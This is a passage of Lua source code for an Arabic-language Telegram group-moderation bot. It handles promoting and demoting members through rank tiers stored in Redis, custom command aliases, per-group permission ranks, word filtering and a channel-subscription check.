hxouse = "المطور الثالث"
elseif is_onall(msg.sender_user_id_) then
hxouse = "المدير العام"
elseif is_moall(msg.sender_user_id_) then
hxouse = "الادمن العام"
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
hxouse = "المنشئ الاساسي"
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
hxouse = "المنشئ"
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
hxouse = "المدير"
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
hxouse = "الادمن"
else
hxouse = "العضو" 
end
return hxouse
end  
-------
---------------Function Set Sudo3--------  
function setdev3(msg,chat,user)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. user)
local hxouse_res = user_info_
if user_info_ then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..user..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم رفعه ( مطور رتبه ثالثه ) *', 1, 'md')
end
end 
---------------Function Del Sudo3-------- 
function deldev3(msg,chat,user)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. user)
local hxouse_res = user_info_
if user_info_ then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..user..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم تنزيله من ( قائمه المطورين ) *', 1, 'md')
end
end
---------------Function Set onall-------- 
function setonall(msg,chat,user)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. user)
local hxouse_res = user_info_
if user_info_ then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..user..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم رفعه ( مدير عام ) *', 1, 'md')
end
end
---------------Function Del Onall-------- 
function delonall(msg,chat,user)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. user)
local hxouse_res = user_info_
if user_info_ then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..user..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم تنزيله من ( قائمه المدراء العامين ) *', 1, 'md')
end
end
---------------Function Set Moall-------- 
function setmoall(msg,chat,user)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. user)
local hxouse_res = user_info_
if user_info_ then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..user..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم رفعه ( ادمن عام ) *', 1, 'md')
end
end
---------------Function Del Moall-------- 
function delmoall(msg,chat,user)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. user)
local hxouse_res = user_info_
if user_info_ then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..user..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم تنزيله من ( قائمه الادمنيه العامين ) *', 1, 'md')
end
end
---------------Function Set Vipall-------- 
function setvipall(msg,chat,user)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. user)
local hxouse_res = user_info_
if user_info_ then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..user..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم رفعه ( مميز عام ) *', 1, 'md')
end
end
---------------Function Del Vipall-------- 
function delvipall(msg,chat,user)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. user)
local hxouse_res = user_info_
if user_info_ then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..user..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم تنزيله من ( قائمه المميزين العامين ) *', 1, 'md')
end
end
---------------Function Set Monsh-------- 
function setmonsh(msg,chat,user)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. user)
local hxouse_res = user_info_
if user_info_ then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..user..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم رفعه ( منشئ اساسي ) *', 1, 'md')
end
end
---------------Function Del Monsh-------- 
function delmonsh(msg,chat,user)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. user)
local hxouse_res = user_info_
if user_info_ then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..user..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم تنزيله من ( قائمه المنشئين الاساسيين ) *', 1, 'md')
end
end
---------------Function Set Monsh2-------- 
function setmonsh2(msg,chat,user)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. user)
local hxouse_res = user_info_
if user_info_ then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..user..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم رفعه ( منشئ ) *', 1, 'md')
end
end
---------------Function Del Monsh2-------- 
function delmonsh2(msg,chat,user)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. user)
local hxouse_res = user_info_
if user_info_ then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..user..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم تنزيله من ( قائمه المنشئين ) *', 1, 'md')
end
end
---------------Function Set Owner-------- 
function setowner(msg,chat,user)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. user)
local hxouse_res = user_info_
if user_info_ then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..user..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم رفعه ( مدير ) *', 1, 'md')
end
end
---------------Function Del Owner-------- 
function delowner(msg,chat,user)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. user)
local hxouse_res = user_info_
if user_info_ then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..user..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم تنزيله من ( قائمه المدراء ) *', 1, 'md')
end
end
---------------Function Set Momod-------- 
function setmomod(msg,chat,user)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. user)
local hxouse_res = user_info_
if user_info_ then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..user..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم رفعه ( ادمن ) *', 1, 'md')
end
end
---------------Function Del Momod-------- 
function delmomod(msg,chat,user)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. user)
local hxouse_res = user_info_
if user_info_ then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..user..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم تنزيله من ( قائمه الادمنيه ) *', 1, 'md')
end
end
---------------Function Set Vipmem-------- 
function setvipmem(msg,chat,user)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. user)
local hxouse_res = user_info_
if user_info_ then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..user..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم رفعه ( عضو مميز ) *', 1, 'md')
end
end
---------------Function Del Vipmem-------- 
function delvipmem(msg,chat,user)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. user)
local hxouse_res = user_info_
if user_info_ then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..user..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم تنزيله من ( قائمه الاعضاء المميزين ) *', 1, 'md')
end
end
-------
function dxdx(user_id,chat_id)
if is_leaderid(user_id) then
var = true  
elseif hxousedx1:sismember(HXOUSE..'bot:admins:', user_id) then
var = true  
elseif hxousedx1:sismember(HXOUSE..'bot:onall:', user_id) then
var = true  
elseif hxousedx1:sismember(HXOUSE..'bot:moall:', user_id) then
var = true  
elseif hxousedx1:sismember(HXOUSE..'bot:vpall:', user_id) then
var = true  
elseif hxousedx1:sismember(HXOUSE..'bot:monsh:'..chat_id, user_id) then
var = true
elseif is_monsh(chat_id, user_id) then
var = true
elseif hxousedx1:sismember(HXOUSE..'bot:monsh2:'..chat_id, user_id) then
var = true  
elseif hxousedx1:sismember(HXOUSE..'bot:owners:'..chat_id, user_id) then
var = true  
elseif hxousedx1:sismember(HXOUSE..'bot:momod:'..chat_id, user_id) then
var = true  
elseif hxousedx1:sismember(HXOUSE..'bot:vipmem:'..chat_id, user_id) then  
var = true  
else  
var = false  
end  
return var
end
function fadx(user_id,chat_id)
if is_leaderid(user_id) then
var = 'botow'  
elseif hxousedx1:sismember(HXOUSE..'bot:admins', user_id) then
var = 'sudo3'  
elseif hxousedx1:sismember(HXOUSE..'bot:monsh:'..chat_id, user_id) then
var = 'monsh'
elseif hxousedx1:sismember(HXOUSE..'bot:monsh2:'..chat_id, user_id) then
var = 'monsh2'
elseif hxousedx1:sismember(HXOUSE..'bot:owners:'..chat_id, user_id) then
var = 'owner'  
else  
var = 'No'
end  
return var
end 
-------------------------------------HXOUSE TEAM---------------------------------------------------------
local function check_filter_words(msg, value)
local hash = (HXOUSE..'bot:filters:'..msg.chat_id_)
if hash then
local names = hxousedx1:hkeys(hash)
local text = ''
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not is_momod(msg.sender_user_id_, msg.chat_id_)then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
end
end
end
------------

--------------------
local getChat = function(chat_id, cb)
tdcli_function({ID = "GetChat", chat_id_ = chat_id}, cb or dl_cb, nil)
end
-------------------------HXOUSE TEAM--------------------
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({
ID = request_id,
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = input_message_content
}, callback or dl_cb, extra)
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = {
ID = "InputMessageVoice",
voice_ = getInputFile(voice),
duration_ = duration or 0,
waveform_ = waveform,
caption_ = caption
}
sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = {
ID = "InputMessageSticker",
sticker_ = getInputFile(sticker),
width_ = 0,
height_ = 0
}
sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 
local function getChannelMembers(channel_id, offset, filter, limit,cb) 
tdcli_function ({ 
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {ID = "ChannelMembers" .. filter},
offset_ = offset,limit_ = limit}, 
cb, nil) 
end
function formsgg(msgs) 
local hxouse = ''  
if msgs < 100 then 
hxouse = "ضعيف جدا"
elseif msgs < 250 then 
hxouse = "ضعيف"
elseif msgs < 500 then 
hxouse = "غير متفاعل"
elseif msgs < 750 then 
hxouse = "متوسط"
elseif msgs < 1000 then 
hxouse = "متفاعل"
elseif msgs < 2000 then 
hxouse = "قمه التفاعل"
elseif msgs < 3000 then 
hxouse = "ملك التفاعل"
elseif msgs < 4000 then 
hxouse = "اسطوره التفاعل"
elseif msgs < 5000 then 
hxouse = "نار وشرار" 
elseif msgs < 6000 then 
hxouse = "جهنم حبي" 
elseif msgs < 7000 then 
hxouse = "فول" 
elseif msgs < 8000 then 
hxouse = "معلك لربك" 
elseif msgs < 9000 then 
hxouse = "حارك الكروب" 
end 
return hxouse
end
function title_name(GroupID) 
tdcli_function({ID ="GetChat",chat_id_=GroupID
},function(arg,data) 
hxousedx1:set(HXOUSE..'bot:group:name'..GroupID,data.title_) 
end,nil) 
return hxousedx1:get(HXOUSE..'bot:group:name'..GroupID)  end
-------------------------HXOUSE TEAM------------------------------
function faedrmoned(chat_id, user_id, msg_id, text, offset, length) local tt = hxousedx1:get(HXOUSE..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
---------------------------------HXOUSE TEAM-------------------------------------------------------------------
function tdcli_update_callback(data)
end
-------------------------------------------hxouse
function hxouse11(msg)
local var = true 
if hxousedx1:get(HXOUSE.."hxouse2") then
local channel = ''..hxousedx1:get(HXOUSE..'hxouse3')..''
local url , res = https.request('https://api.telegram.org/bot'..tokenbot..'/getchatmember?chat_id='..channel..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
hxousedx(msg.chat_id_,msg.id_, 1, "*⌯︙ لا تستطيع استخدام البوت \n⌯︙ لانك لم تشترك في قناة البوت \n⌯︙ اشترك بالقناة لتتمكن من استخدامه \n\n⌯︙ { قناة البوت* :- ["..channel.."] }\n", 1 , "md")
elseif data.ok then
return var
end
else
return var
end
end
function tdcli_update_callback(data)
local our_id = hxousedx1:get(HXOUSE.."Our_ID") or 0
local api_id = hxousedx1:get(HXOUSE.."Bot:Api_ID") or 0
if data.ID == "UpdateNewMessage" then
local msg = data.message_
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
text = data.message_.content_.text_
if text and hxousedx1:get(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = hxousedx1:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
hxousedx1:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
hxousedx1:del(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
hxousedx1:srem(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙تم مسح الامر من المجموعه", 1, 'html')  
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙لا يوجد امر بهذا الاسم", 1, 'html')
end
hxousedx1:del(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if data.message_.content_.text_ then
local NewCmmd = hxousedx1:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
-------------
if text and hxousedx1:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
hxousedx1:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ارسل الامر الجديد", 1, 'html')
hxousedx1:del(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
hxousedx1:set(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and hxousedx1:get(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = hxousedx1:get(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
hxousedx1:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
hxousedx1:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙تم حفظ الامر", 1, 'html')
hxousedx1:del(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text == "الاوامر المضافه" and hxouse11(msg) then
local list = hxousedx1:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_.."")
t = "⌯︙ قائمه الاوامر المضافه↓↓ : \nٴ… … … … … … … … … … …\n"
for k,v in pairs(list) do
Cmds = hxousedx1:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..""..k.."- ("..v..") ~ {"..Cmds.."}\n"
else
t = t..""..k.."- ("..v..") \n"
end
end
if #list == 0 then
t = "⌯︙ لا يوجد اوامر مضافه ༯"
end
hxousedx(msg.chat_id_, msg.id_, 1, "["..t.."]", 1, 'md')
end
if text == "حذف الاوامر المضافه" or text == "مسح الاوامر المضافه" and hxouse11(msg) then
local list = hxousedx1:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(list) do
hxousedx1:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
hxousedx1:del(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
end
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙تم مسح الاوامر المضافه", 1, 'html')
end
if text == "اضف امر" then
hxousedx1:set(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ارسل الامر القديم", 1, 'html')
return false
end
if text == "حذف امر" or text == "مسح امر" and hxouse11(msg) then 
hxousedx1:set(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ارسل الامر الذي قمت باضافته يدويا", 1, 'html')
return false
end
if text == "الصلاحيات" and hxouse11(msg) then 
local list = hxousedx1:smembers(bot_id.."Coomds"..msg.chat_id_)
if #list == 0 then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙لا يوجد صلاحيات مضافه ❌", 1, 'html')
return false
end
t = "⌯︙ قائمه الصلاحيات المضافه↓↓ : \nٴ… … … … … … … … … … …\n"
for k,v in pairs(list) do
var = hxousedx1:get(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
if var then
t = t..""..k.."- "..v.." ~ ("..var..")\n"
else
t = t..""..k.."- "..v.."\n"
end
end
hxousedx(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if text == "مسح الصلاحيات" and hxouse11(msg) then
local list = hxousedx1:smembers(bot_id.."Coomds"..msg.chat_id_)
for k,v in pairs(list) do
hxousedx1:del(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
hxousedx1:del(bot_id.."Coomds"..msg.chat_id_)
end
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙تم مسح جميع الصلاحيات", 1, 'html')
end
if text and text:match("^اضف صلاحيه (.*)$") and hxouse11(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
hxousedx1:set(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
hxousedx1:sadd(bot_id.."Coomds"..msg.chat_id_,ComdNew)  
hxousedx1:setex(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ارسل نوع الصلاحيه \n⌯︙{ عضو ~ مميز  ~ ادمن  ~ مدير }", 1, 'html') 
end
if text and text:match("^مسح صلاحيه (.*)$") or text and text:match("^حذف صلاحيه (.*)$") and hxouse11(msg) then 
ComdNew = text:match("^مسح صلاحيه (.*)$") or text:match("^حذف صلاحيه (.*)$")
hxousedx1:del(bot_id.."Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙تم مسح الصلاحيه", 1, 'html')
end
if hxousedx1:get(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙تم الغاء الامر", 1, 'html')
hxousedx1:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not is_monsh(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ارسل نوع الصلاحيه \n⌯︙تستطيع اضافه صلاحيه { عضو ~ مميز  ~ ادمن }", 1, 'html')
return false
end
end
if text == "ادمن" then
if not is_owner(msg.sender_user_id_, msg.chat_id_) then 
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ارسل نوع الصلاحيه \n⌯︙تستطيع اضافه صلاحيه { عضو ~ مميز }", 1, 'html')
return false
end
end
if text == "مميز" then
if not is_momod(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ارسل نوع الصلاحيه \n⌯︙تستطيع اضافه صلاحيه { عضو }", 1, 'html')
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = hxousedx1:get(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
hxousedx1:set(bot_id.."Comd:New:rt:bot:"..textn..msg.chat_id_,text)
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙تم اضافه الصلاحيه", 1, 'html')
hxousedx1:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end
if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 and hxouse11(msg) then 
local hxousert = text:match("رفع (.*)")
if hxousedx1:sismember(bot_id.."Coomds"..msg.chat_id_,hxousert) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local fdrt = hxousedx1:get(bot_id.."Comd:New:rt:bot:"..hxousert..msg.chat_id_)
if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'HXOUSEiq')..')'..' )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم رفعه ( '..hxousert..' ) بنجاح*', 1, 'md')
hxousedx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,hxousert) 
hxousedx1:sadd(HXOUSE..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
elseif fdrt == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'HXOUSEiq')..')'..' )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم رفعه ( '..hxousert..' ) بنجاح*', 1, 'md')
hxousedx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,hxousert)
hxousedx1:sadd(HXOUSE..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
elseif fdrt == "مدير" and is_monsh(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'HXOUSEiq')..')'..' )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم رفعه ( '..hxousert..' ) بنجاح*', 1, 'md')
hxousedx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,hxousert)  
hxousedx1:sadd(HXOUSE..'bot:owners:'..msg.chat_id_, result.sender_user_id_)
elseif fdrt == "عضو" and is_momod(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'HXOUSEiq')..')'..' )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم رفعه ( '..hxousert..' ) بنجاح*', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 and hxouse11(msg) then 
local hxousert = text:match("تنزيل (.*)")
if hxousedx1:sismember(bot_id.."Coomds"..msg.chat_id_,hxousert) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local fdrt = hxousedx1:get(bot_id.."Comd:New:rt:bot:"..hxousert..msg.chat_id_)
if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'HXOUSEiq')..')'..' )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم تنزيله من ( '..hxousert..' )*', 1, 'md')
hxousedx1:srem(HXOUSE..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
hxousedx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif fdrt == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'HXOUSEiq')..')'..' )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم تنزيله من ( '..hxousert..' )*', 1, 'md')
hxousedx1:srem(HXOUSE..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
hxousedx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif fdrt == "مدير" and is_monsh(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'HXOUSEiq')..')'..' )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم تنزيله من ( '..hxousert..' )*', 1, 'md')
hxousedx1:srem(HXOUSE..'bot:owners:'..msg.chat_id_, result.sender_user_id_)
hxousedx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif fdrt == "عضو" and is_momod(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'HXOUSEiq')..')'..' )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم تنزيله من ( '..hxousert..' )*', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^رفع (.*) @(.*)") and hxouse11(msg) then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if hxousedx1:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local fdrt = hxousedx1:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..result.title_..'](t.me/'..(text1[3] or 'HXOUSEiq')..')'..' )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم رفعه ( '..text1[2]..' ) بنجاح*', 1, 'md')
hxousedx1:sadd(HXOUSE..'bot:vipmem:'..msg.chat_id_, result.id_)
hxousedx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif fdrt == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
